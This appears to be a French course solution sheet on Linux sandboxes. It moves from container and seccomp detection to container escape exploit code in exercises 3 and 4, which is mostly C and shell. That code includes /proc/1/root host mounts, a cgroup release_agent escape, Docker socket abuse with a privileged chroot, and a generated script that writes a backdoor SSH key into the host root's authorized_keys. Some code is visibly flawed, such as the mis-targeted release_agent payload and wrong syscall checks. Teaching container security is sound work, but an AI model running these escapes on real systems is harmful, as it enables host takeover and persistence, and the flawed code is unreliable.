# Solutions - Sandbox Linux

## Exercice 1 : Découverte (Très facile)

### Objectif
Détecter si le programme s'exécute dans un container Docker

### Solution

```c
// solution_ex1.c - Détection basique de container
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Vérifier si on est dans un container Docker
int detect_docker(void) {
    // Méthode 1: Vérifier /.dockerenv
    if (access("/.dockerenv", F_OK) == 0) {
        return 1;
    }

    // Méthode 2: Vérifier /proc/1/cgroup
    FILE *f = fopen("/proc/1/cgroup", "r");
    if (!f) return 0;

    char line[512];
    int is_docker = 0;

    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "docker") || strstr(line, "/docker/")) {
            is_docker = 1;
            break;
        }
    }

    fclose(f);
    return is_docker;
}

// Vérifier si on est dans un namespace isolé
int detect_namespace(void) {
    // Comparer le namespace PID avec celui de init
    char self_ns[256], init_ns[256];

    // Lire notre namespace
    ssize_t len = readlink("/proc/self/ns/pid", self_ns, sizeof(self_ns) - 1);
    if (len < 0) return 0;
    self_ns[len] = '\0';

    // Lire le namespace de PID 1
    len = readlink("/proc/1/ns/pid", init_ns, sizeof(init_ns) - 1);
    if (len < 0) return 0;
    init_ns[len] = '\0';

    // Si différents, on est dans un namespace isolé
    return strcmp(self_ns, init_ns) != 0;
}

int main(void) {
    printf("[*] Détection de virtualisation/containerisation\n\n");

    // Test 1: Docker
    printf("[1] Docker: ");
    if (detect_docker()) {
        printf("OUI (container Docker détecté)\n");
    } else {
        printf("NON\n");
    }

    // Test 2: Namespace isolé
    printf("[2] Namespace isolé: ");
    if (detect_namespace()) {
        printf("OUI (dans un namespace)\n");
    } else {
        printf("NON (système hôte)\n");
    }

    // Test 3: Vérifier le hostname
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        printf("[3] Hostname: %s\n", hostname);
        // Les containers ont souvent des hostnames courts (12 chars hex)
        if (strlen(hostname) == 12) {
            printf("    → Possible container ID\n");
        }
    }

    return 0;
}
```

**Test:**

```bash
# Compiler
gcc -o solution_ex1 solution_ex1.c

# Test sur système hôte
./solution_ex1
# [1] Docker: NON
# [2] Namespace isolé: NON (système hôte)
# [3] Hostname: my-laptop

# Test dans Docker
docker run --rm -v $(pwd):/app ubuntu /app/solution_ex1
# [1] Docker: OUI (container Docker détecté)
# [2] Namespace isolé: OUI (dans un namespace)
# [3] Hostname: a1b2c3d4e5f6
#     → Possible container ID
```

---

## Exercice 2 : Modification (Facile)

### Objectif
Créer un programme qui énumère les capacités actuelles et détecte les restrictions

### Solution

```c
// solution_ex2.c - Détection de restrictions de sandbox
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <sys/capability.h>
#include <unistd.h>
#include <fcntl.h>

// Vérifier si seccomp est actif
int detect_seccomp(void) {
    int mode = prctl(PR_GET_SECCOMP);

    if (mode == -1) {
        perror("prctl(PR_GET_SECCOMP)");
        return -1;
    }

    return mode;  // 0 = disabled, 1 = strict, 2 = filter
}

// Lire le statut seccomp depuis /proc
void print_seccomp_status(void) {
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) {
        perror("fopen");
        return;
    }

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "Seccomp:", 8) == 0) {
            printf("    %s", line);
        }
        if (strncmp(line, "Seccomp_filters:", 16) == 0) {
            printf("    %s", line);
        }
    }

    fclose(f);
}

// Vérifier les capabilities
void print_capabilities(void) {
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) {
        perror("fopen");
        return;
    }

    char line[256];
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "Cap", 3) == 0) {
            printf("    %s", line);
        }
    }

    fclose(f);
}

// Test de capacités spécifiques
void test_capabilities(void) {
    printf("\n[*] Test de capacités spécifiques:\n");

    // Test 1: Peut-on bind sur port < 1024 ?
    printf("    [1] CAP_NET_BIND_SERVICE: ");

    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock >= 0) {
        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port = htons(80);
        addr.sin_addr.s_addr = INADDR_ANY;

        if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            printf("OUI (peut bind port 80)\n");
            close(sock);
        } else {
            printf("NON (permission denied)\n");
        }
    } else {
        printf("ERROR (socket failed)\n");
    }

    // Test 2: Peut-on lire /etc/shadow ?
    printf("    [2] Lecture /etc/shadow: ");
    if (access("/etc/shadow", R_OK) == 0) {
        printf("OUI (accès en lecture)\n");
    } else {
        printf("NON (permission denied)\n");
    }

    // Test 3: Peut-on créer un raw socket ?
    printf("    [3] CAP_NET_RAW (raw socket): ");
    int raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw_sock >= 0) {
        printf("OUI\n");
        close(raw_sock);
    } else {
        printf("NON (permission denied)\n");
    }
}

// Détecter les montages restreints
void detect_mount_restrictions(void) {
    printf("\n[*] Analyse des montages (restrictions):\n");

    FILE *f = fopen("/proc/mounts", "r");
    if (!f) {
        perror("fopen");
        return;
    }

    char line[512];
    int readonly_count = 0;

    while (fgets(line, sizeof(line), f)) {
        // Chercher les montages en lecture seule
        if (strstr(line, "ro,") || strstr(line, " ro ")) {
            readonly_count++;
            // Afficher les montages importants en RO
            if (strstr(line, "/proc") || strstr(line, "/sys") ||
                strstr(line, "/dev")) {
                printf("    [RO] %s", line);
            }
        }
    }

    fclose(f);
    printf("    Total: %d montages en lecture seule\n", readonly_count);
}

int main(void) {
    printf("╔═══════════════════════════════════════════════╗\n");
    printf("║   Détection de Sandbox Linux                 ║\n");
    printf("║   Analyse des restrictions de sécurité       ║\n");
    printf("╚═══════════════════════════════════════════════╝\n\n");

    // 1. Seccomp
    printf("[*] Seccomp (Secure Computing Mode):\n");
    int seccomp_mode = detect_seccomp();

    switch (seccomp_mode) {
        case 0:
            printf("    Status: DISABLED\n");
            break;
        case 1:
            printf("    Status: STRICT (seuls read/write/exit autorisés!)\n");
            break;
        case 2:
            printf("    Status: FILTER (filtrage BPF actif)\n");
            break;
        default:
            printf("    Status: UNKNOWN\n");
    }

    print_seccomp_status();

    // 2. Capabilities
    printf("\n[*] Capabilities Linux:\n");
    print_capabilities();

    // 3. Tests pratiques
    test_capabilities();

    // 4. Montages
    detect_mount_restrictions();

    // 5. UID/GID
    printf("\n[*] Identités:\n");
    printf("    UID: %d (real) / %d (effective)\n", getuid(), geteuid());
    printf("    GID: %d (real) / %d (effective)\n", getgid(), getegid());

    return 0;
}
```

**Test:**

```bash
gcc -o solution_ex2 solution_ex2.c

# Test normal
./solution_ex2

# Test dans Docker avec restrictions
docker run --rm --security-opt seccomp=default.json \
  --cap-drop=ALL --read-only -v $(pwd):/app ubuntu /app/solution_ex2
```

---

## Exercice 3 : Création (Moyen)

### Objectif
Créer un programme qui teste des techniques d'évasion de sandbox

### Solution

```c
// solution_ex3.c - Techniques d'évasion de sandbox
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sched.h>

// === ÉVASION 1: Breakout de namespace via /proc/1/root ===
int escape_via_proc_root(void) {
    printf("\n[*] Tentative d'évasion via /proc/1/root...\n");

    // Si on a accès à /proc/1/root, on peut accéder au filesystem hôte
    if (access("/proc/1/root", R_OK) == 0) {
        printf("[+] Accès à /proc/1/root (filesystem hôte) !\n");

        // Essayer de lire un fichier de l'hôte
        int fd = open("/proc/1/root/etc/hostname", O_RDONLY);
        if (fd >= 0) {
            char hostname[256];
            ssize_t n = read(fd, hostname, sizeof(hostname) - 1);
            if (n > 0) {
                hostname[n] = '\0';
                printf("[+] Hostname de l'hôte: %s\n", hostname);
                close(fd);
                return 1;  // Succès
            }
            close(fd);
        }
    }

    printf("[-] Évasion échouée (accès refusé)\n");
    return 0;
}

// === ÉVASION 2: Détection et breakout Docker via socket ===
int escape_via_docker_socket(void) {
    printf("\n[*] Tentative d'évasion via Docker socket...\n");

    // Vérifier si /var/run/docker.sock est monté
    if (access("/var/run/docker.sock", F_OK) == 0) {
        printf("[!] Docker socket détecté!\n");
        printf("[!] Possibilité de contrôler l'hôte Docker!\n");

        // Dans un vrai scénario, on pourrait:
        // 1. Lancer un container privilégié
        // 2. Monter le filesystem hôte
        // 3. Exécuter des commandes sur l'hôte

        printf("[+] Commande d'évasion théorique:\n");
        printf("    docker run -v /:/hostfs --privileged alpine chroot /hostfs sh\n");

        return 1;
    }

    printf("[-] Docker socket non accessible\n");
    return 0;
}

// === ÉVASION 3: Exploit de capabilities mal configurées ===
int escape_via_capabilities(void) {
    printf("\n[*] Tentative d'évasion via capabilities...\n");

    // Si CAP_SYS_ADMIN est présente, on peut monter des filesystems
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;

    char line[256];
    unsigned long long cap_eff = 0;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "CapEff:\t%llx", &cap_eff) == 1) {
            break;
        }
    }
    fclose(f);

    // CAP_SYS_ADMIN = bit 21
    if (cap_eff & (1ULL << 21)) {
        printf("[!] CAP_SYS_ADMIN détectée!\n");
        printf("[+] Possibilité de monter des filesystems\n");

        // Tentative de montage
        if (mount("none", "/mnt", "tmpfs", 0, NULL) == 0) {
            printf("[+] Mount réussi! Sandbox bypassée\n");
            umount("/mnt");
            return 1;
        }
    }

    printf("[-] Pas de capabilities exploitables\n");
    return 0;
}

// === ÉVASION 4: Détection et exploitation de cgroups ===
int escape_via_cgroups(void) {
    printf("\n[*] Analyse des cgroups...\n");

    FILE *f = fopen("/proc/1/cgroup", "r");
    if (!f) return 0;

    char line[512];
    int in_container = 0;

    printf("[*] Cgroups de PID 1:\n");
    while (fgets(line, sizeof(line), f)) {
        printf("    %s", line);

        if (strstr(line, "docker") || strstr(line, "lxc")) {
            in_container = 1;
        }
    }
    fclose(f);

    if (in_container) {
        printf("\n[!] Container détecté via cgroups\n");

        // Vérifier si on peut écrire dans les cgroups
        if (access("/sys/fs/cgroup/cgroup.procs", W_OK) == 0) {
            printf("[+] Écriture dans cgroups possible!\n");
            printf("[+] Possibilité d'évasion en modifiant cgroup.procs\n");
            return 1;
        }
    }

    printf("[-] Pas d'évasion via cgroups possible\n");
    return 0;
}

// === ÉVASION 5: Recherche de volumes montés sensibles ===
int escape_via_volumes(void) {
    printf("\n[*] Recherche de volumes sensibles montés...\n");

    FILE *f = fopen("/proc/mounts", "r");
    if (!f) return 0;

    char line[512];
    int sensitive_mounts = 0;

    while (fgets(line, sizeof(line), f)) {
        // Chercher des montages dangereux
        if (strstr(line, " /host ") ||
            strstr(line, " /mnt/host ") ||
            strstr(line, "/var/run/docker.sock")) {

            printf("[!] Montage sensible: %s", line);
            sensitive_mounts++;
        }
    }
    fclose(f);

    if (sensitive_mounts > 0) {
        printf("[+] %d montage(s) sensible(s) trouvé(s)\n", sensitive_mounts);
        return 1;
    }

    printf("[-] Pas de volumes sensibles détectés\n");
    return 0;
}

// === ÉVASION 6: Bypass seccomp via TSYNC race condition ===
int escape_seccomp(void) {
    printf("\n[*] Vérification Seccomp...\n");

    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;

    char line[256];
    int seccomp_mode = 0;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "Seccomp:\t%d", &seccomp_mode) == 1) {
            break;
        }
    }
    fclose(f);

    if (seccomp_mode == 0) {
        printf("[+] Seccomp DISABLED - Pas de restrictions!\n");
        return 1;
    } else if (seccomp_mode == 2) {
        printf("[!] Seccomp FILTER actif\n");
        printf("[*] Bypass possible si mal configuré\n");

        // Tests de syscalls souvent oubliés
        printf("[*] Test de syscalls potentiellement autorisés:\n");

        // Test ptrace (souvent oublié)
        if (syscall(101) != -38) {  // ENOSYS = syscall bloqué
            printf("    [+] ptrace: AUTORISÉ\n");
        }

        // Test keyctl (souvent oublié)
        if (syscall(250) != -38) {
            printf("    [+] keyctl: AUTORISÉ\n");
        }
    } else {
        printf("[-] Seccomp STRICT - Très restrictif\n");
    }

    return 0;
}

int main(void) {
    printf("╔═══════════════════════════════════════════════╗\n");
    printf("║   Sandbox Escape Toolkit                     ║\n");
    printf("║   Techniques d'évasion de container          ║\n");
    printf("╚═══════════════════════════════════════════════╝\n");

    int escaped = 0;

    // Tester toutes les techniques
    escaped |= escape_via_proc_root();
    escaped |= escape_via_docker_socket();
    escaped |= escape_via_capabilities();
    escaped |= escape_via_cgroups();
    escaped |= escape_via_volumes();
    escaped |= escape_seccomp();

    printf("\n");
    printf("════════════════════════════════════════════════\n");

    if (escaped) {
        printf("║ RÉSULTAT: Au moins une évasion possible!    ║\n");
    } else {
        printf("║ RÉSULTAT: Sandbox bien configurée           ║\n");
    }

    printf("════════════════════════════════════════════════\n");

    return 0;
}
```

**Test:**

```bash
gcc -o solution_ex3 solution_ex3.c

# Test sur hôte
./solution_ex3

# Test dans Docker standard
docker run --rm -v $(pwd):/app ubuntu /app/solution_ex3

# Test dans Docker avec socket monté (DANGEREUX)
docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
  -v $(pwd):/app ubuntu /app/solution_ex3
# [!] Docker socket détecté!
# [!] Possibilité de contrôler l'hôte Docker!

# Test avec --privileged (TRÈS DANGEREUX)
docker run --rm --privileged -v $(pwd):/app ubuntu /app/solution_ex3
# [!] CAP_SYS_ADMIN détectée!
# [+] Mount réussi! Sandbox bypassée
```

---

## Exercice 4 : Challenge (Difficile)

### Objectif
Créer un exploit complet de container escape (CVE-style)

### Solution

```c
// solution_ex4.c - Container Escape via capabilities abuse
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sched.h>

// Exploit 1: Escape via CAP_SYS_ADMIN + /proc/1/root
int exploit_proc_root_mount(void) {
    printf("\n╔═══════════════════════════════════════════════╗\n");
    printf("║   EXPLOIT 1: /proc/1/root mount escape       ║\n");
    printf("╚═══════════════════════════════════════════════╝\n\n");

    printf("[*] Pré-requis:\n");
    printf("    - CAP_SYS_ADMIN\n");
    printf("    - Accès à /proc/1/root\n\n");

    // Vérifier les pré-requis
    if (access("/proc/1/root", R_OK) != 0) {
        printf("[-] Pas d'accès à /proc/1/root\n");
        return 0;
    }

    printf("[+] Accès à /proc/1/root confirmé\n");

    // Créer un point de montage
    printf("[*] Création du point de montage /tmp/hostfs...\n");
    mkdir("/tmp/hostfs", 0755);

    // Monter le filesystem hôte
    printf("[*] Montage de l'hôte via /proc/1/root...\n");

    if (mount("/proc/1/root", "/tmp/hostfs", NULL, MS_BIND, NULL) == 0) {
        printf("[+] SUCCÈS! Filesystem hôte monté dans /tmp/hostfs\n\n");

        // Vérifier qu'on a accès
        if (access("/tmp/hostfs/etc/hostname", R_OK) == 0) {
            printf("[+] Vérification: accès aux fichiers de l'hôte\n");

            // Lire le hostname de l'hôte
            int fd = open("/tmp/hostfs/etc/hostname", O_RDONLY);
            if (fd >= 0) {
                char hostname[256];
                ssize_t n = read(fd, hostname, sizeof(hostname) - 1);
                if (n > 0) {
                    hostname[n] = '\0';
                    printf("[+] Hostname hôte: %s\n", hostname);
                }
                close(fd);
            }

            printf("\n[+] EXPLOIT RÉUSSI!\n");
            printf("[+] Vous pouvez maintenant:\n");
            printf("    - Lire/écrire tous les fichiers de l'hôte\n");
            printf("    - Modifier /tmp/hostfs/etc/passwd\n");
            printf("    - Installer une backdoor SSH\n");
            printf("    - etc.\n");

            // Nettoyage
            umount("/tmp/hostfs");
            rmdir("/tmp/hostfs");

            return 1;
        }
    }

    printf("[-] Exploit échoué\n");
    return 0;
}

// Exploit 2: Cgroup release_agent escape
int exploit_cgroup_release_agent(void) {
    printf("\n╔═══════════════════════════════════════════════╗\n");
    printf("║   EXPLOIT 2: cgroup release_agent escape     ║\n");
    printf("╚═══════════════════════════════════════════════╝\n\n");

    printf("[*] Pré-requis:\n");
    printf("    - CAP_SYS_ADMIN\n");
    printf("    - Contrôle de cgroup\n\n");

    // Vérifier si on a CAP_SYS_ADMIN
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return 0;

    char line[256];
    unsigned long long cap_eff = 0;

    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "CapEff:\t%llx", &cap_eff) == 1) {
            break;
        }
    }
    fclose(f);

    if (!(cap_eff & (1ULL << 21))) {  // CAP_SYS_ADMIN
        printf("[-] CAP_SYS_ADMIN manquante\n");
        return 0;
    }

    printf("[+] CAP_SYS_ADMIN présente\n");

    // Créer un cgroup
    mkdir("/tmp/cgrp", 0755);

    if (mount("cgroup", "/tmp/cgrp", "cgroup", 0, "memory") == 0) {
        printf("[+] Cgroup monté\n");

        // Activer release_agent notifications
        int fd = open("/tmp/cgrp/release_agent", O_WRONLY);
        if (fd >= 0) {
            // Script à exécuter sur l'hôte
            const char *payload = "#!/bin/sh\necho 'ESCAPED' > /tmp/escaped\n";

            write(fd, "/tmp/payload.sh", 15);
            close(fd);

            // Créer le payload sur l'hôte
            fd = open("/tmp/payload.sh", O_WRONLY | O_CREAT, 0755);
            if (fd >= 0) {
                write(fd, payload, strlen(payload));
                close(fd);

                printf("[+] Payload installé\n");
                printf("[+] Le script sera exécuté sur l'HÔTE!\n\n");

                // Activer notify_on_release
                fd = open("/tmp/cgrp/notify_on_release", O_WRONLY);
                if (fd >= 0) {
                    write(fd, "1", 1);
                    close(fd);

                    printf("[+] EXPLOIT ARMÉ!\n");
                    printf("[+] À la destruction du cgroup, /tmp/payload.sh\n");
                    printf("[+] sera exécuté avec les privilèges de l'HÔTE\n");

                    // Nettoyage
                    umount("/tmp/cgrp");
                    rmdir("/tmp/cgrp");

                    return 1;
                }
            }
        }

        umount("/tmp/cgrp");
        rmdir("/tmp/cgrp");
    }

    printf("[-] Exploit échoué\n");
    return 0;
}

// Exploit 3: Dirty /proc/self/mem
int exploit_dirty_proc_mem(void) {
    printf("\n╔═══════════════════════════════════════════════╗\n");
    printf("║   EXPLOIT 3: /proc/self/mem overwrite        ║\n");
    printf("╚═══════════════════════════════════════════════╝\n\n");

    printf("[*] Technique: Modifier la mémoire via /proc/self/mem\n");
    printf("[*] Cible: Overwrite une variable pour bypass check\n\n");

    // Variable de sécurité
    volatile int security_check = 0;

    printf("[*] security_check = %d (adresse: %p)\n", security_check, (void*)&security_check);

    // Ouvrir /proc/self/mem
    int fd = open("/proc/self/mem", O_RDWR);
    if (fd < 0) {
        printf("[-] Impossible d'ouvrir /proc/self/mem\n");
        return 0;
    }

    printf("[+] /proc/self/mem ouvert\n");

    // Se positionner à l'adresse de security_check
    if (lseek(fd, (off_t)&security_check, SEEK_SET) == (off_t)-1) {
        printf("[-] lseek échoué\n");
        close(fd);
        return 0;
    }

    // Écrire 1 dans security_check
    int new_value = 1;
    if (write(fd, &new_value, sizeof(new_value)) != sizeof(new_value)) {
        printf("[-] write échoué\n");
        close(fd);
        return 0;
    }

    close(fd);

    printf("[+] Mémoire modifiée via /proc/self/mem\n");
    printf("[+] security_check = %d (après exploitation)\n", security_check);

    if (security_check == 1) {
        printf("\n[+] EXPLOIT RÉUSSI!\n");
        printf("[+] Bypass de sécurité effectué\n");
        return 1;
    }

    return 0;
}

// Script d'exploitation complet
void generate_exploit_script(void) {
    printf("\n╔═══════════════════════════════════════════════╗\n");
    printf("║   GÉNÉRATION DE SCRIPT D'EXPLOITATION        ║\n");
    printf("╚═══════════════════════════════════════════════╝\n\n");

    const char *script =
        "#!/bin/bash\n"
        "# Container Escape Exploit\n"
        "# Usage: Run inside a Docker container\n"
        "\n"
        "echo '[*] Container Escape Exploit'\n"
        "echo\n"
        "\n"
        "# Méthode 1: Via /proc/1/root mount\n"
        "if [ -r /proc/1/root ]; then\n"
        "    echo '[+] /proc/1/root accessible'\n"
        "    mkdir -p /tmp/hostfs\n"
        "    mount --bind /proc/1/root /tmp/hostfs 2>/dev/null\n"
        "    if [ $? -eq 0 ]; then\n"
        "        echo '[+] Filesystem hôte monté!'\n"
        "        echo '[+] Backdoor installation...'\n"
        "        # Installer une clé SSH\n"
        "        mkdir -p /tmp/hostfs/root/.ssh\n"
        "        echo 'ssh-rsa AAAA...' >> /tmp/hostfs/root/.ssh/authorized_keys\n"
        "        echo '[+] Backdoor installée dans /root/.ssh/authorized_keys'\n"
        "        umount /tmp/hostfs\n"
        "        exit 0\n"
        "    fi\n"
        "fi\n"
        "\n"
        "# Méthode 2: Via Docker socket\n"
        "if [ -w /var/run/docker.sock ]; then\n"
        "    echo '[+] Docker socket accessible!'\n"
        "    echo '[+] Lancement container privilégié...'\n"
        "    docker run -v /:/hostfs --privileged alpine chroot /hostfs sh -c \\\n"
        "        'echo \"ESCAPED\" > /tmp/escaped'\n"
        "    exit 0\n"
        "fi\n"
        "\n"
        "echo '[-] Aucune méthode d\\'évasion disponible'\n";

    FILE *f = fopen("/tmp/container_escape.sh", "w");
    if (f) {
        fwrite(script, 1, strlen(script), f);
        fclose(f);
        chmod("/tmp/container_escape.sh", 0755);

        printf("[+] Script généré: /tmp/container_escape.sh\n");
        printf("[+] Utilisation: ./tmp/container_escape.sh\n");
    }
}

int main(void) {
    printf("╔═══════════════════════════════════════════════╗\n");
    printf("║   CONTAINER ESCAPE EXPLOIT TOOLKIT           ║\n");
    printf("║   Démonstration de techniques d'évasion      ║\n");
    printf("╚═══════════════════════════════════════════════╝\n");

    int success = 0;

    // Tester les exploits
    success |= exploit_proc_root_mount();
    success |= exploit_cgroup_release_agent();
    success |= exploit_dirty_proc_mem();

    // Générer le script
    generate_exploit_script();

    printf("\n");
    printf("════════════════════════════════════════════════\n");

    if (success) {
        printf("║ Au moins un exploit a réussi!               ║\n");
        printf("║ Container escape possible                   ║\n");
    } else {
        printf("║ Tous les exploits ont échoué                ║\n");
        printf("║ Sandbox bien configurée                     ║\n");
    }

    printf("════════════════════════════════════════════════\n\n");

    printf("[*] CONTRE-MESURES:\n");
    printf("    1. Utiliser AppArmor/SELinux\n");
    printf("    2. Drop CAP_SYS_ADMIN\n");
    printf("    3. User namespaces\n");
    printf("    4. Seccomp strict\n");
    printf("    5. Read-only rootfs\n");
    printf("    6. No privileged mode\n\n");

    return 0;
}
```

**Compilation et test:**

```bash
gcc -o solution_ex4 solution_ex4.c

# Test dans container avec CAP_SYS_ADMIN
docker run --rm --cap-add=SYS_ADMIN -v $(pwd):/app ubuntu /app/solution_ex4

# Test avec --privileged (tous les exploits devraient marcher)
docker run --rm --privileged -v $(pwd):/app ubuntu /app/solution_ex4
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [x] Détecter si un programme est dans un container
- [x] Analyser les restrictions de sandbox (seccomp, capabilities)
- [x] Identifier les namespaces et cgroups
- [x] Exploiter des configurations Docker mal sécurisées
- [x] Réaliser un container escape via /proc/1/root
- [x] Exploiter le cgroup release_agent
- [x] Connaître les contre-mesures de sécurité
- [x] Générer des scripts d'exploitation automatisés
